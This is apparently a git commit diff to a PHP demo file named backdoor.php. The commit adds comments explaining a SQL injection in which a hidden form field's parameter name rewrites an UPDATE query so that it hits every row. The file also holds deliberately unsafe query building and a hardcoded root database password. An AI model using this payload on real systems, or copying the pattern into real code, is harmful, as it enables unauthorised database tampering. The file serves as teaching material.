e9f245a17f4ec4e1b31d310aca182f75cd6aa407
UnknownAD <59281997+UnknownAD@users.noreply.github.com>
2020-08-17 08:24:51 -0400

    Update backdoor.php

--- backdoor.php
+++ backdoor.php
@@ -1,3 +1,4 @@
+<-- The Attacker Side -->
 <form action="/backdoor.php" type="hidden">
 <input name='username="hacked for the 2nd time"where"1"="1";#' value="" type="hidden">
 <input name="username" value="demo" type="hidden">
@@ -5,6 +6,7 @@
 <input type="submit"> 
 </form>
 <?php
+    // Server Side
 $database=new pdo("mysql:host=localhost;dbname=dat","root","17095674");
 $params=array();
 $set="";
@@ -17,6 +19,10 @@ $set.=$key."=".":$key";
     $params[$key]=$value;
 }
 $cmd="UPDATE USERS SET $set WHERE ID=:id";
+    /*it will be something like this:
+     UPDATE USERS SET $setusername="hacked for the 2nd time"where"1"="1"  --the rest of the code will be ignored.. check this by doing echo to $cmd
+    
+    */
 echo $cmd;
 $database->prepare($cmd)->execute($params);
 ?>
